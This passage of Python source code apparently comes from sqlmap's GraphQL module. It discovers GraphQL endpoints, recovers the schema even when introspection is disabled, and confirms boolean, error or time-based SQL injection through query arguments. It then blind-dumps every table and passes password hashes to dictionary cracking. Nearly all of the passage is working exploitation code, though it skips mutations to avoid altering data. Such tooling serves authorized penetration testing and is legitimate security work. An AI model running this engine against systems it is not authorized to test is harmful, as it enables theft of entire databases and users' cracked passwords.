            for item in v:
                if isinstance(item, dict):
                    rows.append([_cell(item.get(c)) for c in columns])
            return (columns, rows) if rows else None
        if isinstance(v, dict):
            columns = sorted(v.keys())
            rows = [[_cell(v.get(c)) for c in columns]]
            return (columns, rows)
    return None


def _grid(columns, rows):
    # Render a simple ASCII table
    if not columns or not rows:
        return "(empty)"
    widths = []
    for i, c in enumerate(columns):
        w = len("%s" % (c,))
        for r in rows:
            w = max(w, len("%s" % (r[i] if i < len(r) else "",)))
        widths.append(w)
    sep = "+-" + "-+-".join("-" * w for w in widths) + "-+"
    header = "| " + " | ".join(("%s" % (c,)).ljust(w) for c, w in zip(columns, widths)) + " |"
    lines = [sep, header, sep]
    for row in rows:
        lines.append("| " + " | ".join(("%s" % (row[i] if i < len(row) else "",)).ljust(w)
                                        for i, w in enumerate(widths)) + " |")
    lines.append(sep)
    return "\n".join(lines)


def _renderTypeStr(chain):
    # Render a GraphQL type chain as a readable string: [User]! or String!
    named = _leafName(chain) or ""
    prefix = ""
    suffix = ""
    for kind, _ in chain:
        if kind == "NON_NULL":
            suffix = "!"
        elif kind == "LIST":
            prefix = "[" + prefix
            suffix = suffix + "]"
    return prefix + named + suffix


def _dumpSchema(schema, endpoint):
    # Dump the schema as readable tables: types and their fields/arguments
    if not schema:
        return

    types = schema.get("types") or []
    queryName = (schema.get("queryType") or {}).get("name")
    mutationName = (schema.get("mutationType") or {}).get("name")

    rows = []
    for t in types:
        if not isinstance(t, dict):
            continue
        kind = t.get("kind", "")
        name = t.get("name", "")
        if kind not in ("OBJECT", "INPUT_OBJECT"):
            continue
        rootTag = ""
        if name == queryName:
            rootTag = " [Query]"
        elif name == mutationName:
            rootTag = " [Mutation]"
        fields = t.get("fields") or t.get("inputFields") or []
        if not fields:
            rows.append([kind, name + rootTag, "", "", "", ""])
        for f in fields:
            fName = f.get("name", "")
            typeStr = _renderTypeStr(_unwrapType(f.get("type", {})))
            for a in (f.get("args") or []):
                aType = _renderTypeStr(_unwrapType(a.get("type", {})))
                strategy = _classifyArg(a.get("type", {})) or ""
                rows.append([kind, name + rootTag, fName, typeStr, a["name"], aType, strategy])
            if not (f.get("args") or []):
                rows.append([kind, name + rootTag, fName, typeStr, "", "", ""])

    if rows:
        conf.dumper.singleString("GraphQL schema (%s):\n%s" % (endpoint,
            _grid(["Kind", "Type", "Field", "Return", "Argument", "ArgType", "Strategy"], rows)))


# --- Orchestration ----------------------------------------------------------

def _testSlot(slot, endpoint):
    """Confirm an injection on `slot` and report it. Returns (oracleType, oracle, detail)
    where `oracle` is (truth, truthBatch, dbmsHint) for a usable blind-SQLi primitive (None for an
    error-only / non-differential point) and `oracleType` is None when nothing is confirmed."""

    kind = oracleType = detail = templatePage = dbmsHint = threshold = None

    # Boolean content inference is the most reliable extraction oracle, so it is preferred over the
    # (also valid) error and time signals, which serve as fallbacks for non-differential slots.
    oracleType, templatePage = _detectBoolean(slot, endpoint)
    if oracleType:
        kind = "boolean"
        logger.info("boolean-based oracle confirmed (%s)" % oracleType)
    else:
        errorType, detail = _detectError(slot, endpoint)
        if errorType:
            kind, oracleType = "error", errorType
            logger.info("error-based oracle confirmed")
        else:
            oracleType, threshold, dbmsHint = _detectTime(slot, endpoint)
            if oracleType:
                kind = "time"
                logger.info("time-based oracle confirmed (back-end '%s', threshold %.1fs)" % (dbmsHint, threshold))

    if not kind:
        logger.info("no oracle confirmed for this slot")
        return None, None, None

    title = "GraphQL %s" % oracleType
    payload = _buildQuery(slot, _SQL_BOOLEAN_TRUE) or _SQL_BOOLEAN_TRUE
    report = "---\nParameter: %s.%s(%s:) (%s)\n    Type: GraphQL injection\n    Title: %s\n    Payload: %s\n---" % (
        slot.parentType, slot.fieldName, slot.targetArg, slot.strategy, title, _escapeGraphQLString(payload))
    conf.dumper.singleString(report)
    if conf.beep:
        beep()

    # In-band exposure: the always-true payload reflecting extra records directly
    if kind == "boolean" and templatePage:
        rows = _dumpInband(endpoint, slot, templatePage)
        if rows:
            columns, dataRows = rows
            logger.info("in-band data exposure: %d record(s)" % len(dataRows))
            conf.dumper.singleString("GraphQL in-band data for %s.%s(%s:):\n%s" % (
                slot.parentType, slot.fieldName, slot.targetArg, _grid(columns, dataRows)))

    if kind in ("boolean", "time"):
        truth, truthBatch = _makeOracle(slot, endpoint, dbmsHint, threshold)
        if truth:
            return oracleType, (truth, truthBatch, dbmsHint), detail

    return oracleType, None, detail


def _enumerate(oracle):
    """Drive the blind-SQLi oracle to fingerprint the back-end and enumerate it:
    banner, current user/database, the table list, and a full blind dump of every
    user table. All of this is recovered without knowing any SQL identifier up front."""

    truth, truthBatch, dbmsHint = oracle

    dbms = dbmsHint or _fingerprint(truth)
    if not dbms:
        logger.warning("could not fingerprint the back-end DBMS through the GraphQL oracle")
        return

    dialect = DIALECTS[dbms]
    logger.info("back-end DBMS: '%s'" % dbms)
    conf.dumper.singleString("GraphQL back-end DBMS: %s" % dbms)

    infer = _inferrer(truth, truthBatch, dialect)

    for label, expr in (("banner", dialect.banner),
                        ("current user", dialect.currentUser),
                        ("current database", dialect.currentDb)):
        if not expr:
            continue
        value = infer(expr)
        if value:
            logger.info("%s: '%s'" % (label, value))
            conf.dumper.singleString("GraphQL %s: %s" % (label, value))

    tablesRaw = infer(dialect.tables) if dialect.tables else None
    tables = [_ for _ in (tablesRaw or "").split(",") if _]
    if not tables:
        logger.warning("no tables recovered through the oracle")
        return

    logger.info("fetching tables")
    conf.dumper.singleString("GraphQL database tables [%d]:\n%s" % (
        len(tables), _grid(["table"], [[_] for _ in tables])))

    for table in tables:
        parsed = _dumpTable(infer, dialect, table)
        if not parsed:
            continue
        columns, rows = parsed
        logger.info("fetched %d entr%s from table '%s'" % (len(rows), "y" if len(rows) == 1 else "ies", table))

        # Populate kb.data.dumpedTable and feed it through the standard
        # password-hash analysis (hash-recognition + optional dictionary-crack)
        # BEFORE displaying the dump, so that cracked passwords appear inline
        # next to their hashes (matching the regular SQL table-dump workflow)
        if len(rows) > 0 and not conf.disableHashing:
            oldDumpedTable = getattr(kb.data, "dumpedTable", None)
            try:
                from lib.utils.hash import attackDumpedTable
                kb.data.dumpedTable = {"__infos__": {"count": len(rows)}}
                for ci, col in enumerate(columns):
                    kb.data.dumpedTable[col] = {"values": [row[ci] if ci < len(row) else "" for row in rows]}
                attackDumpedTable()
                # Re-read the rows: attackDumpedTable() may have appended
                # cracked passwords in-place (e.g. "hash (password)")
                for ci, col in enumerate(columns):
                    if col in kb.data.dumpedTable:
                        vals = kb.data.dumpedTable[col].get("values", [])
                        for ri in xrange(min(len(rows), len(vals))):
                            if ci < len(rows[ri]):
                                rows[ri][ci] = vals[ri]
            except Exception:
                pass
            finally:
                kb.data.dumpedTable = oldDumpedTable

        conf.dumper.singleString("GraphQL dump of table '%s' [%d]:\n%s" % (
            table, len(rows), _grid(columns, rows)))


def graphqlScan():
    # Entry point for '--graphql': detect the GraphQL endpoint, introspect the
    # schema, enumerate injectable argument slots, confirm an injection oracle on a
    # query slot, then fingerprint and blind-enumerate the SQL back-end through it
    # (banner, tables, full table dumps). Mutation slots are reported but not
    # exercised, to avoid modifying server-side data.

    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--graphql' is self-contained: it discovers the GraphQL endpoint, "
    debugMsg += "enumerates the schema, and injects SQL/NoSQL payloads into reachable "
    debugMsg += "argument slots. SQL enumeration switches (e.g. --banner, --dbs, "
    debugMsg += "--tables) are ignored"
    logger.debug(debugMsg)

    url = conf.url.rstrip("/") if conf.url else ""

    if not url:
        logger.error("missing target URL")
        return

    # 1. Endpoint detection
    logger.info("probing for a GraphQL endpoint")

    # If the user supplied a URL that already contains '/graphql/' (e.g.
    # .../graphql/get_int?id=1, the broker probe URL), extract the base so
    # that probe paths are not appended to a non-GraphQL sub-path
    _m = re.match(r"(https?://[^/]+(?:/[^/]+)*?/graphql)(?:/.*)?$", url.rstrip("/"))
    if _m:
        url = _m.group(1)

    endpoint, _ = _detectEndpoint(url)
    if not endpoint:
        logger.error("no GraphQL endpoint found at '%s' (tried %d common paths)" % (
            url, len(GRAPHQL_ENDPOINT_PATHS) + 1))
        return

    logger.info("found GraphQL endpoint at '%s'" % endpoint)

    # 2. Schema introspection
    logger.info("introspecting the GraphQL schema")
    schema = _introspect(endpoint)

    if schema:
        types = schema.get("types") or []
        logger.info("introspection returned %d types" % len(types))
        slots = _extractSlots(schema)
        if not slots:
            logger.warning("no injectable argument slots found in the schema")
            _dumpSchema(schema, endpoint)
            return
    else:
        # Introspection blocked: try to recover the schema from field-suggestion errors
        logger.warning("introspection failed (disabled or rejected); trying suggestion-based recovery")
        slots = _introspectViaSuggestions(endpoint)
        if not slots:
            logger.error("could not recover the schema (introspection disabled and no field suggestions)")
            return

    querySlots = [_ for _ in slots if _.operation == "query"]
    mutationSlots = [_ for _ in slots if _.operation == "mutation"]

    logger.info("enumerated %d injectable argument slot(s): %d query, %d mutation" % (
        len(slots), len(querySlots), len(mutationSlots)))

    # 4. Schema dump (before detection -- matches regular sqlmap table/column
    # enumeration preceding data retrieval). Only when introspection succeeded; the
    # suggestion-recovered path has no full schema document to render.
    if schema:
        _dumpSchema(schema, endpoint)

    if mutationSlots:
        names = sorted(set("%s(%s:)" % (_.fieldName, _.targetArg) for _ in mutationSlots))
        warnMsg = "skipping %d mutation slot(s) to avoid modifying server-side data " % len(mutationSlots)
        warnMsg += "(%s). They may carry the same injection. Test them manually if intended" % ", ".join(names)
        logger.warning(warnMsg)

    # 5. Per-slot detection; keep the first usable blind-SQLi oracle for enumeration
    oracle = None
    found = False

    for slot in querySlots:
        logger.info("testing slot %s.%s(%s:) [%s]" % (
            slot.parentType, slot.fieldName, slot.targetArg, slot.strategy))

        oracleType, slotOracle, _ = _testSlot(slot, endpoint)
        if oracleType:
            found = True
        if slotOracle and not oracle:
            oracle = slotOracle
            logger.info("retaining %s.%s(%s:) as the blind-SQLi oracle for back-end enumeration" % (
                slot.parentType, slot.fieldName, slot.targetArg))

    # 6. Back-end enumeration through the retained oracle
    if oracle:
        _enumerate(oracle)

    if not found:
        logger.warning("no injectable slots found. The schema is shown above")

    logger.info("GraphQL scan complete")
